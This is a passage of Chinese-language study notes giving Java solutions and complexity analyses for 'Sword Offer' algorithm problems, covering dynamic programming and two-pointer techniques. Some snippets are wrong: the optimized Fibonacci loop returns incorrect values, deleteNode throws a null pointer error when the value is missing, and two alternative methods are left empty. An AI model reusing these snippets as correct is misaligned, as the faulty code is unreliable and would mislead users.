`F(N)`）。斐波那契数列的定义如下：\n>\n>```\n>F(0) = 0,   F(1) = 1\n>F(N) = F(N - 1) + F(N - 2), 其中 N > 1.\n>```\n>\n>斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。\n>\n>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。\n>\n>**示例 1：**\n>\n>```\n>输入：n = 2\n>输出：1\n>```\n>\n>**示例 2：**\n>\n>```\n>输入：n = 5\n>输出：5\n>```\n\n### 解答\n\n#### 方法1：动态规划\n\n```java\nclass Solution {\n    public int fib(int n) {\n        if(n == 0 || n==1) return n;\n        int[] dp = new int[n + 1];\n        dp[0] = 0;\n        dp[1] = 1;\n        for(int i = 2; i <= n; i++){\n            dp[i] = dp[i-1] + dp[i-2];\n            dp[i] %= 1000000007;\n        }\n        return dp[n];\n    }\n}\n\n//优化\nclass Solution {\n    public int fib(int n) {\n        int fn0 = 0, fn1 = 1, sum;\n        for(int i = 0; i <= n; i++){\n            sum = (fn0 + fn1) % 1000000007;\n            fn0 = fn1;\n            fn1 = sum; \n        }\n        return fn1;\n    }\n}\n```\n\n#### 方法2：矩阵快速幂\n\n。。。\n\n### 复杂度\n\n#### 方法1\n\n-   **时间复杂度 O(N) ：** 计算 f(n) 需循环 n 次，每轮循环内计算操作使用 O(1) 。\n-   **空间复杂度 O(1) ：** 几个标志变量使用常数大小的额外空间。\n\n#### 方法2\n\n- **时间复杂度：O(logn)**\n- **空间复杂度：O(1)**\n\n## 10- II. 青蛙跳台阶问题\n\n### 题目\n\n>一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。\n>\n>答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。\n>\n>示例 1：\n>\n>```\n>输入：n = 2\n>输出：2\n>```\n>\n>示例 2：\n>\n>```\n>输入：n = 7\n>输出：21\n>```\n>\n>示例 3：\n>\n>```\n>输入：n = 0\n>输出：1\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208171708144.png)\n\n```java\nclass Solution {\n    public int numWays(int n) {\n        if(n == 0 || n==1) return 1;\n        int[] dp = new int[n + 1];\n        dp[0] = 1;\n        dp[1] = 1;\n        for(int i = 2; i <= n; i++){\n            dp[i] = dp[i-1] + dp[i-2];\n            dp[i] %= 1000000007;\n        }\n        return dp[n];\n    }\n}\n\n//优化\nclass Solution {\n    public int numWays(int n) {\n        int a = 1, b = 1, sum;\n        for(int i = 0; i < n; i++){\n            sum = (a + b) % 1000000007;\n            a = b;\n            b = sum;\n        }\n        return a;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 计算 f(n) 需循环 n 次，每轮循环内计算操作使用 O(1) 。\n-   **空间复杂度 O(1)：** 几个标志变量使用常数大小的额外空间。\n\n## 63.股票的最大利润\n\n### 题目\n\n>假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖该股票一次可能获得的最大利润是多少？\n>\n>示例 1:\n>\n>```\n>输入: [7,1,5,3,6,4]\n>输出: 5\n>解释: 在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。\n>注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格。\n>```\n>\n>示例 2:\n>\n>```\n>输入: [7,6,4,3,1]\n>输出: 0\n>解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。\n>```\n\n### 解答\n\n#### 方法1：暴力法\n\n```java\npublic class Solution {\n    public int maxProfit(int[] prices) {\n        int maxprofit = 0;\n        for (int i = 0; i < prices.length - 1; i++) {\n            for (int j = i + 1; j < prices.length; j++) {\n                int profit = prices[j] - prices[i];\n                if (profit > maxprofit) {\n                    maxprofit = profit;\n                }\n            }\n        }\n        return maxprofit;\n    }\n}\n```\n\n#### 方法2：动态规划\n\n![](https://img.jwt1399.top/img/202208171820656.png)\n\n前 i 日最大利润 = max(前(i−1)日最大利润，第i日价格−前i日最低价格)\n\n`dp[i] = max⁡(dp[i−1], prices[i] − min⁡(prices[0:i]))`\n\n```java\nclass Solution {\n    public int maxProfit(int[] prices) {\n        if(prices.length == 0)return 0;\n      \tint[] dp = new int[prices.length];\n        dp[0] = 0; \n        int min = prices[0];\n        for(int i = 1; i < prices.length; i++){\n            min = Math.min(min,prices[i]);\n            dp[i] = Math.max(dp[i-1],prices[i]-min);\n        }\n        return dp[prices.length-1];\n    }\n}\n```\n\n效率优化：\n\n- **时间复杂度降低：** 前 iii 日的最低价格 min⁡(prices\\[0:i\\]) 时间复杂度为 O(i)。而在遍历 prices 时，可以借助一个变量（记为成本 cost ）每日更新最低价格。优化后的转移方程为：\n\n  `dp[i] = max⁡(dp[i−1],prices[i] - min⁡(cost,prices[i])`\n\n- **空间复杂度降低：** 由于 dp\\[i] 只与 dp\\[i−1\\]， prices\\[i\\], cost 相关，因此可使用一个变量（记为利润 profit）代替 dp 列表。优化后的转移方程为：\n\n  `profit = max⁡(profit,prices[i] − min⁡(cost,prices[i])`\n\n```java\nclass Solution {\n    public int maxProfit(int[] prices) {\n        int cost = Integer.MAX_VALUE, profit = 0;\n        for(int price : prices) {\n            cost = Math.min(cost, price);\n            profit = Math.max(profit, price - cost);\n        }\n        return profit;\n    }\n}\n```\n\n### 复杂度\n\n#### 方法1\n\n-   时间复杂度：O(n<sup>2</sup>)。循环运行 (n−1)+(n−2)+⋯+2+1\\=n(n−1)/2 次。\n-   空间复杂度：O(1)。只使用了常数个变量。\n\n#### 方法2\n\n-   时间复杂度：O(n)，只需要遍历一次。\n-   空间复杂度：O(1)，只使用了常数个变量。\n\n# 第 9 天 动态规划（中等）\n\n## 42.连续子数组的最大和\n\n### 题目\n\n> 输入一个整型数组，数组中的一个或连续多个整数组成一个子数组。求所有子数组的和的最大值。\n>\n> 要求时间复杂度为O(n)。\n>\n> 示例1:\n>\n> ```\n> 输入: nums = [-2,1,-3,4,-1,2,1,-5,4]\n> 输出: 6\n> 解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。\n> ```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208171820679.png)\n\n```java\nclass Solution {\n    public int maxSubArray(int[] nums) {\n    int dp[] = new int[nums.length];\n    dp[0] = nums[0];\n    int res = dp[0];\n    for(int i = 1; i < nums.length; i++){\n        dp[i] = Math.max(dp[i - 1] + nums[i], nums[i]);\n        res = Math.max(res, dp[i]);\n    }\n        return res;\n    }\n}\n\n//由于 dp[i] 只与 dp[i-1] 和 nums[i] 有关系，因此可以将原数组 nums 用作 dp 列表，即直接在 nums 上修改即可。\nclass Solution {\n    public int maxSubArray(int[] nums) {\n        int res = nums[0];\n        for(int i = 1; i < nums.length; i++) {\n            nums[i] += Math.max(nums[i - 1], 0);\n            res = Math.max(res, nums[i]);\n        }\n        return res;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** 线性遍历数组 nums 即可获得结果，使用 O(N) 时间。\n-   **空间复杂度 O(1) ：** 使用常数大小的额外空间。\n\n## 47.礼物的最大价值\n\n### 题目\n\n> 在一个 m*n 的棋盘的每一格都放有一个礼物，每个礼物都有一定的价值（价值大于 0）。你可以从棋盘的左上角开始拿格子里的礼物，并每次向右或者向下移动一格、直到到达棋盘的右下角。给定一个棋盘及其上面的礼物的价值，请计算你最多能拿到多少价值的礼物？\n>\n> 示例 1:\n>\n> ```\n> 输入: \n> [\n>   [1,3,1],\n>   [1,5,1],\n>   [4,2,1]\n> ]\n> 输出: 12\n> 解释: 路径 1→3→5→2→1 可以拿到最多价值的礼物\n> ```\n\n### 解答\n\n设动态规划矩阵 dp ，dp(i,j) 代表从棋盘的左上角开始，到达单元格 (i,j) 时能拿到礼物的最大累计价值。\n\n-   当 i\\=0 且 j\\=0 时，为起始元素；\n-   当 i\\=0 且 j≠0 时，为矩阵第一行元素，只可从左边到达；\n-   当 i≠0 且 j\\=0 时，为矩阵第一列元素，只可从上边到达；\n-   当 i≠0 且 j≠0 时，可从左边或上边到达；\n\n![](https://img.jwt1399.top/img/202208181212232.png)\n\n```java\nclass Solution {\n    public int maxValue(int[][] grid) {\n        int m = grid.length;\n        int n = grid[0].length;\n        int [][]dp = new int[m][n];\n        for(int i = 0; i < m; i++){\n            for(int j = 0; j < n; j++){\n                if(i == 0 && j == 0) \n                  dp[i][j] = grid[0][0];\n                else if(i == 0) \n                    dp[i][j] = dp[i][j - 1] + grid[i][j]; \n                else if(j == 0)  \n                    dp[i][j] = dp[i - 1][j] + grid[i][j]; \n                else\n                    dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]) + grid[i][j];\n            }\n        }\n        return dp[m - 1][n - 1];\n    }\n}\n\n//优化\n/**\n  由于 dp[i][j] 只与 dp[i-1][j] , dp[i][j-1] , grid[i][j]有关系，因此可以将原矩阵 grid 用作 dp 矩阵，即直接在 grid 上修改即可。应用此方法可省去 dp 矩阵使用的额外空间，因此空间复杂度从 O(MN) 降至 O(1)\n**/\nclass Solution {\n    public int maxValue(int[][] grid) {\n        int m = grid.length, n = grid[0].length;\n        for(int i = 0; i < m; i++) {\n            for(int j = 0; j < n; j++) {\n                if(i == 0 && j == 0) continue;\n                if(i == 0) grid[i][j] += grid[i][j - 1];\n                else if(j == 0) grid[i][j] += grid[i - 1][j];\n                else grid[i][j] += Math.max(grid[i][j - 1], grid[i - 1][j]);\n            }\n        }\n        return grid[m - 1][n - 1];\n    }\n}\n//再优化\n/**\n  以上代码逻辑清晰，和转移方程直接对应，但仍可提升效率：当 grid 矩阵很大时， i = 0 或 j = 0 的情况仅占极少数，相当循环每轮都冗余了一次判断。因此，可先初始化矩阵第一行和第一列，再开始遍历递推。\n**/\nclass Solution {\n    public int maxValue(int[][] grid) {\n        int m = grid.length, n = grid[0].length;\n        for(int j = 1; j < n; j++) // 初始化第一行\n            grid[0][j] += grid[0][j - 1];\n        for(int i = 1; i < m; i++) // 初始化第一列\n            grid[i][0] += grid[i - 1][0];\n        for(int i = 1; i < m; i++)\n            for(int j = 1; j < n; j++) \n                grid[i][j] += Math.max(grid[i][j - 1], grid[i - 1][j]);\n        return grid[m - 1][n - 1];\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(MN) ：** M,N 分别为矩阵行高、列宽；动态规划需遍历整个 grid 矩阵，使用 O(MN) 时间。\n-   **空间复杂度 O(1) ：** 原地修改使用常数大小的额外空间。\n\n# 第 10 天 动态规划（中等）\n\n## 46. 把数字翻译成字符串\n\n### 题目\n\n>给定一个数字，我们按照如下规则把它翻译为字符串：0 翻译成 “a” ，1 翻译成 “b”，……，11 翻译成 “l”，……，25 翻译成 “z”。一个数字可能有多个翻译。请编程实现一个函数，用来计算一个数字有多少种不同的翻译方法。\n>\n>示例 1:\n>\n>```\n>输入: 12258\n>输出: 5\n>解释: 12258有5种不同的翻译，分别是\"bccfi\", \"bwfi\", \"bczi\", \"mcfi\"和\"mzi\"\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208181400798.png)\n\n**状态定义：**记数字 num 第 i 位数字为 x<sub>i</sub> ，数字 num 的位数为 n ；dp[i] 代表以 x<sub>i</sub> 为结尾的数字的翻译方案数量。\n\n**转移方程：**可被翻译的两位数区间：当 x<sub>i−1 </sub>= 0 时，组成的两位数是无法被翻译的（例如 00,01,02,⋯ ），因此 x<sub>i−1</sub>x<sub>i </sub>的区间为 \\[10,25\\] 。\n\n![](https://img.jwt1399.top/img/202208181407897.png)\n\n**初始状态：** dp\\[0\\] = dp[1] = 1，即 “无数字” 和 “第 1 位数字” 的翻译方法数量均为 1 \n\n> Q： 无数字情况 dp[0] = 1 从何而来？\n> A： 当 num 第 1, 2 位的组成的数字 ∈[10,25] 时，显然应有 2 种翻译方法，即 dp[2] = dp[1] + dp[0] = 2 ，而显然 dp[1] = 1 ，因此推出 dp[0] = 1 。\n\n#### 方法1：**字符串遍历**\n\n```java\nclass Solution {\n    public int translateNum(int num) {\n        String s = String.valueOf(num);\n        int []dp = new int[s.length()+1];\n        dp[0] = dp[1] = 1;\n        for(int i = 2; i <= s.length(); i++){\n            String tmp = s.substring(i - 2, i);\n            if(tmp.compareTo(\"10\") >= 0 && tmp.compareTo(\"25\") <= 0)\n                dp[i] = dp[i-1] + dp[i-2];\n            else\n                dp[i] = dp[i-1];\n        }\n        return dp[s.length()];\n    }\n}\n\n//优化\n//由于 dp[i]只与 dp[i - 1]和 dp[i - 2]有关，因此可使用变量 a,b,c 分别记录，两变量交替前进即可。此方法可省去 dp 列表使用的 O(N) 的额外空间。\nclass Solution {\n    public int translateNum(int num) {\n        String s = String.valueOf(num);\n        int a = 1, b = 1;\n        for(int i = 2; i <= s.length(); i++) {\n            String tmp = s.substring(i - 2, i);\n            int c = tmp.compareTo(\"10\") >= 0 && tmp.compareTo(\"25\") <= 0 ? a + b : a;\n            b = a;\n            a = c;\n        }\n        return a;\n    }\n}\n```\n\n#### 方法2：**数字求余**\n\n上述方法虽然已经节省了 dp 列表的空间占用，但字符串 s 仍使用了 O(N) 大小的额外空间。\n\n```java\n\n```\n\n### 复杂度\n\n#### 方法1\n\n- **时间复杂度 O(N) ：** N 为字符串 s 的长度（即数字 num 的位数 log⁡(num) ），其决定了循环次数。\n\n-   **空间复杂度 O(N)：** 字符串 s 和 dp 分别使用 O(N) 大小的额外空间。\n\n#### 方法2\n\n-   **时间复杂度 O(N) ：** 同方法1\n-   **空间复杂度 O(1) ：** 几个变量使用常数大小的额外空间。\n\n## 48. 最长不含重复字符的子字符\n\n### 题目\n\n>请从字符串中找出一个最长的不包含重复字符的子字符串，计算该最长子字符串的长度。\n>\n>示例 1:\n>\n>输入: \"abcabcbb\"\n>输出: 3 \n>解释: 因为无重复字符的最长子串是 \"abc\"，所以其长度为 3。\n>示例 2:\n>\n>输入: \"bbbbb\"\n>输出: 1\n>解释: 因为无重复字符的最长子串是 \"b\"，所以其长度为 1。\n>示例 3:\n>\n>输入: \"pwwkew\"\n>输出: 3\n>解释: 因为无重复字符的最长子串是 \"wke\"，所以其长度为 3。\n>请注意，你的答案必须是 子串 的长度，\"pwke\" 是一个子序列，不是子串。\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208192027792.png)\n\n由于返回值是取 dp 列表最大值，因此可借助变量 tmp 存储 dp[j]，变量 res 每轮更新最大值。此优化可节省 dp 列表使用的 O(N) 大小的额外空间。\n\n#### **方法1：动态规划 + 哈希表**\n\n- 哈希表统计： 遍历字符串 s 时，使用哈希表（记为 dic ）统计各字符最后一次出现的索引位置\n- 左边界 i 获取方式： 遍历到 s[j] 时，可通过访问哈希表 dic[s[j]] 获取最近的相同字符的索引 i\n\n```java\nclass Solution {\n    public int lengthOfLongestSubstring(String s) {\n        Map<Character,Integer> dic = new HashMap<>();\n        int tmp = 0, res = 0;\n        for(int j = 0; j < s.length(); j++){\n            int i = dic.getOrDefault(s.charAt(j), -1);// 获取索引 i\n            dic.put(s.charAt(j),j);// 更新哈希表\n            if(tmp < j - i) tmp = tmp + 1;\n            else tmp = j - i;\n            res = Math.max(tmp,res);// max(dp[j - 1], dp[j])\n        }\n        return res;\n    }\n}\n```\n\nJava 的 getOrDefault(key, default)， 代表当哈希表包含键 key 时返回对应 value ，不包含时返回默认值 default\n\n### 复杂度\n\n时间复杂度 O(N) ： 其中 N 为字符串长度，动态规划需遍历计算 dp 列表。\n空间复杂度 O(1)： 字符的 ASCII 码范围为 00 ~ 127 ，哈希表 dic 最多使用 O(128) = O(1) 大小的额外空间。\n\n# 第 11 天 双指针（简单）\n\n## 18. 删除链表的节点\n\n### 题目\n\n>给定单向链表的头指针和一个要删除的节点的值，定义一个函数删除该节点。\n>\n>返回删除后的链表的头节点。\n>\n>注意：此题对比原题有改动\n>\n>示例 1:\n>\n>```\n>输入: head = [4,5,1,9], val = 5\n>输出: [4,1,9]\n>解释: 给定你链表中值为 5 的第二个节点，那么在调用了你的函数之后，该链表应变为 4 -> 1 -> 9.\n>```\n>\n>示例 2:\n>\n>```\n>输入: head = [4,5,1,9], val = 1\n>输出: [4,5,9]\n>解释: 给定你链表中值为 1 的第三个节点，那么在调用了你的函数之后，该链表应变为 4 -> 5 -> 9.\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208192027335.png)\n\n##### 算法流程：\n\n1.  **特例处理：** 当应删除头节点 `head` 时，直接返回 `head.next` 即可。\n2.  **初始化：** `pre = head` , `cur = head.next` 。\n3.  **定位节点：** 当 `cur` 为空 **或** `cur` 节点值等于 `val` 时跳出。\n    1.  保存当前节点索引，即 `pre = cur` 。\n    2.  遍历下一节点，即 `cur = cur.next` 。\n4.  **删除节点：** 若 `cur` 指向待删除节点，则执行 `pre.next = cur.next` ；若 `cur` 指向 null，代表链表中不包含值为 `val` 的节点。\n5.  **返回值：** 返回链表头部节点 `head` 即可。\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public ListNode deleteNode(ListNode head, int val) {\n        if(head.val == val) return head.next;\n        ListNode pre = head, cur = head.next;\n        while(cur != null && cur.val != val){\n          pre = cur;\n          cur = cur.next;\n        }\n        if(cur.val == val)\n            pre.next = cur.next;\n        return head;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N)：** N 为链表长度，删除操作平均需循环 N/2 次，最差 N 次。\n-   **空间复杂度 O(1) ：** `cur`, `pre` 占用常数大小额外空间。\n\n## 22. 链表中倒数第k个节点\n\n### 题目\n\n>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。\n>\n>例如，一个链表有 6 个节点，从头节点开始，它们的值依次是 1、2、3、4、5、6。这个链表的倒数第 3 个节点是值为 4 的节点。\n>\n>示例：\n>\n>```\n>给定一个链表: 1->2->3->4->5, 和 k = 2.\n>\n>返回链表 4->5.\n>```\n\n### 解答\n\n第一时间想到的解法：\n\n- 先遍历统计链表长度，记为 n ；\n- 设置一个指针走 (n-k)步，即可找到链表倒数第 k 个节点。\n\n![](https://img.jwt1399.top/img/202208201051016.png)\n\n使用双指针则可以不用统计链表长度。\n\n![](https://img.jwt1399.top/img/202208201051503.png)\n\n##### 算法流程：\n\n1.  **初始化：** 前指针 `former` 、后指针 `latter` ，双指针都指向头节点 `head` \n2.  **构建双指针距离：** 前指针 `former` 先向前走 k 步（结束后，双指针 `former` 和 `latter` 间相距 k 步）。\n3.  **双指针共同移动：** 循环中，双指针 `former` 和 `latter` 每轮都向前走一步，直至 `former` 走过链表 **尾节点** 时跳出（跳出后， `latter` 与尾节点距离为 k−1，即 `latter` 指向倒数第 k 个节点）。\n4.  **返回值：** 返回 `latter` 即可。\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public ListNode getKthFromEnd(ListNode head, int k) {\n      ListNode former = head,latter = head;\n      for(int i = 0; i < k; i++){\n        former = former.next;\n      }\n      while(former != null){\n        former = former.next;\n        latter = latter.next;\n      }\n      return latter;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** N 为链表长度；总体看， `former` 走了 N 步， `latter` 走了 (N−k) 步。\n-   **空间复杂度 O(1) ：** 双指针 `former` , `latter` 使用常数大小的额外空间。\n\n# 第 12 天 双指针（简单）\n\n## 25. 合并两个排序的链表\n\n### 题目\n\n>输入两个递增排序的链表，合并这两个链表并使新链表中的节点仍然是递增排序的。\n>\n>示例1：\n>\n>```\n>输入：1->2->4, 1->3->4\n>输出：1->1->2->3->4->4\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208201109218.png)\n\n##### 算法流程：\n\n1.  **初始化：** 伪头节点 dum ，节点 cur 指向 dum 。\n2.  **循环合并：** 当 l1 或 l2 为空时跳出；\n    1.  当 l1.val < l2.val 时： cur 的后继节点指定为 l1，并且 l1 向前走一步；\n    2.  当 l1.val ≥ l2.val 时： cur 的后继节点指定为 l2，并且 l2 向前走一步 ；\n    3.  节点 cur 向前走一步，即 cur \\= cur.next。\n3.  **合并剩余尾部：** 跳出时有两种情况，即 l1 为空 **或** l2 为空。\n    1.  若 l1 ≠ null ： 将 l1 添加至节点 cur 之后；\n    2.  否则： 将 l2 添加至节点 cur 之后。\n4.  **返回值：** 合并链表在伪头节点 dum 之后，因此返回 dum.next 即可。\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public ListNode mergeTwoLists(ListNode l1, ListNode l2) {\n     ListNode dum = new ListNode(0), cur = dum;\n      while(l1 != null && l2 != null){\n        if(l1.val < l2.val) {\n          cur.next = l1;\n          l1 = l1.next;\n        }\n        else{\n           cur.next = l2;\n           l2 = l2.next;\n        }\n        cur = cur.next;\n      }\n      if(l1 != null) cur.next = l1;\n      if(l2 != null) cur.next = l2;\n      return dum.next;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(M+N)：** M,N 分别为链表 l1,l2 的长度，合并操作需遍历两链表。\n-   **空间复杂度 O(1) ：** 节点引用 dum , cur 使用常数大小的额外空间。\n\n## 52. 两个链表的第一个公共节点\n\n### 题目\n\n>输入两个链表，找出它们的第一个公共节点。\n>\n>如下面的两个链表：\n>\n>![](https://img.jwt1399.top/img/202208201148217.png)\n>\n>在节点 c1 开始相交。\n>\n>示例 1：\n>\n>![](https://img.jwt1399.top/img/202208201148988.png)\n>\n>```\n>输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3\n>输出：Reference of the node with value = 8\n>输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。\n>```\n>\n>\n>示例 2：\n>\n>![](https://img.jwt1399.top/img/202208201148108.png)\n>\n>```\n>输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1\n>输出：Reference of the node with value = 2\n>输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。\n>```\n>\n>\n>示例 3：\n>\n>![](https://img.jwt1399.top/img/202208201148832.png)\n>\n>```\n>输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2\n>输出：null\n>输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。\n>解释：这两个链表不相交，因此返回 null。\n>```\n\n### 解答\n\n设「第一个公共节点」为 `node` ，「链表 `headA`」的节点数量为 a ，「链表 `headB`」的节点数量为 b ，「两链表的公共尾部」的节点数量为 c ，则有：\n\n-   头节点 `headA` 到 `node` 前，共有 a−c 个节点；\n-   头节点 `headB` 到 `node` 前，共有 b−c 个节点；\n\n![](https://img.jwt1399.top/img/202210261118942.png)\n\n考虑构建两个节点指针 `A` , `B` 分别指向两链表头节点 `headA` , `headB` ，做如下操作：\n\n-   指针 `A` 先遍历完链表 `headA` ，再开始遍历链表 `headB` ，当走到 `node` 时，共走步数为：a+(b−c)\n\n-   指针 `B` 先遍历完链表 `headB` ，再开始遍历链表 `headA` ，当走到 `node` 时，共走步数为：b+(a−c)\n\na+(b−c) = b+(a−c)，此时指针 `A` , `B` 重合 ，并有两种情况：\n\n1.  若两链表 **有** 公共尾部 (即 c\\>0 ) ：指针 `A` , `B` 同时指向「第一个公共节点」`node` 。\n2.  若两链表 **无** 公共尾部 (即 c\\=0) ：指针 `A` , `B` 同时指向 null 。\n\n因此返回 `A` 即可。\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) {\n *         val = x;\n *         next = null;\n *     }\n * }\n */\nclass Solution {\n    ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA, B = headB;\n        while(A != B){\n          if(A != null) A = A.next;\n          else A = headB;\n          if(B != null) B = B.next;\n          else B = headA;\n        } \n        return A;\n    }\n}\n\n//简化代码\nclass Solution {\n    ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA, B = headB;\n        while(A != B){\n          A = A != null ? A.next : headB;\n          B = B != null ? B.next : headA;\n        } \n        return A;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(a+b)：** 最差情况下（即 ∣a−b∣\\=1 , c\\=0 ），此时需遍历 a+b 个节点。\n-   **空间复杂度 O(1)：** 节点指针 `A` , `B` 使用常数大小的额外空间。\n\n# 第 13 天 双指针（简单）\n\n##  21. 调整数组顺序使奇数位于偶\n\n### 题目\n\n>输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有奇数在数组的前半部分，所有偶数在数组的后半部分。\n>\n>示例：\n>\n>```\n>输入：nums = [1,2,3,4]\n>输出：[1,3,2,4] \n>注：[3,1,2,4] 也是正确的答案之一。\n>```\n\n### 解答\n\n![](https://img.jwt1399.top/img/202208201733132.png)\n\n##### 算法流程：\n\n1.  **初始化：** i , j 双指针，分别指向数组 nums 左右两端；\n2.  **循环交换：** 当 i \\= j  时跳出；\n    1.  指针 i 遇到奇数则执行 i \\= i+1 跳过，直到找到偶数；\n    2.  指针 j 遇到偶数则执行 j \\= j−1 跳过，直到找到奇数；\n    3.  交换 nums\\[i\\] 和 nums\\[j\\] 值；\n3.  **返回值：** 返回已修改的 nums 数组。\n\n 位运算判断奇偶性\n\n  “**`1`**”的二进制 表示形式为 **`00000001`**\n**所以：**`任何整数 & 1`\n\n- 结果为 1 ，则为奇数\n- 结果为 0 ，则为偶数\n\n```java\nclass Solution {\n    public int[] exchange(int[] nums) {\n      int i = 0, j = nums.length - 1, tmp;\n      while(i < j){\n        if(nums[i] % 2 != 0){\n           i++;\n        }\n        if(nums[j] % 2 == 0){\n            j--;\n        }\n        if(i < j){\n          tmp = nums[i];\n          nums[i] = nums[j];\n          nums[j] = tmp; \n        }\n      }\n      return nums;\n    }\n}\n\n//优化\nclass Solution {\n    public int[] exchange(int[] nums) {\n        int i = 0, j = nums.length - 1, tmp;\n        while(i < j) {\n            while(i < j && (nums[i] & 1) == 1) i++;\n            while(i < j && (nums[j] & 1) == 0) j--;\n            tmp = nums[i];\n            nums[i] = nums[j];\n            nums[j] = tmp;\n        }\n        return nums;\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** NNN 为数组 nums 长度，双指针 i, j 共同遍历整个数组。\n-   **空间复杂度 O(1) ：** 双指针 i, j 使用常数大小的额外空间。\n\n## 57. 和为s的两个数字\n\n### 题目\n\n>输入一个递增排序的数组和一个数字s，在数组中查找两个数，使得它们的和正好是s。如果有多对数字的和等于s，则输出任意一对即可。\n>\n>示例 1：\n>\n>```\n>输入：nums = [2,7,11,15], target = 9\n>输出：[2,7] 或者 [7,2]\n>```\n>\n>示例 2：\n>\n>```\n>输入：nums = [10,26,30,31,47,60], target = 40\n>输出：[10,30] 或者 [30,10]\n>```\n\n### 解答\n\n##### 算法流程：\n\n1.  **初始化：** 双指针 i , j 分别指向数组 nums 的左右两端 （俗称对撞双指针）。\n2.  **循环搜索：** 当双指针相遇时跳出；\n    1.  计算和 sum \\= nums\\[i\\]+nums\\[j\\]；\n    2.  若 sum \\> target，则指针 j 向左移动，即执行 j\\=j−1 ；\n    3.  若 sum < target ，则指针 i 向右移动，即执行 i\\=i+1 ；\n    4.  若 sum \\= target ，立即返回数组 \\[nums\\[i\\],nums\\[j\\]\\] ；\n3.  返回空数组，代表无和为 target 的数字组合。\n\n```java\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n      int i = 0, j = nums.length -1;\n      while(i < j){\n        int sum = nums[i] + nums[j];\n        if(sum > target) j--;\n        else if(sum < target) i++;\n        else return new int[]{nums[i],nums[j]};\n      }\n      return null;\n      //return new int[0];\n    }\n}\n```\n\n### 复杂度\n\n-   **时间复杂度 O(N) ：** N 为数组 nums 的长度；双指针共同线性遍历整个数组。\n-   **空间复杂度 O(1) ：** 变量 i, j 使用常数大小的额外空间。\n\n## 58 - I. 翻转单词顺序\n\n### 题目\n\n>输入一个英文句子，翻转句子中单词的顺序，但单词内字符的顺序不变。为简单起见，标点符号和普通字母一样处理。例如输入字符串\"I am a student. \"，则输出\"student. a am I\"。\n>\n>示例 1：\n>\n>```\n>输入: \"the sky is blue\"\n>输出: \"blue is sky the\"\n>```\n>\n>示例 2：\n>\n>```\n>输入: \"  hello world!  \"\n>输出: \"world! hello\"\n>解释: 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。\n>```\n>\n>示例 3：\n>\n>```\n>输入: \"a good   example\"\n>输出: \"example good a\"\n>解释: 如果两个单词间有多余的空格，将反转后单词间的空格减少到只含一个。\n>```\n\n### 解答\n\n#### 方法1：调用API\n\n1. 使用 `split` 将字符串按空格分割成字符串数组；\n2. 使用 `reverse` 将字符串数组进行反转；\n3. 使用 `join` 方法将字符串数组拼成一个字符串。\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        // 除去开头和末尾的空白字符\n        s = s.trim();\n        // 正则匹配连续的空白字符作为分隔符分割\n        List<String> wordList = Arrays.asList(s.split(\"\\\\s+\"));\n        Collections.reverse(wordList);\n        return String.join(\" \", wordList);\n    }\n}\n```\n\n- 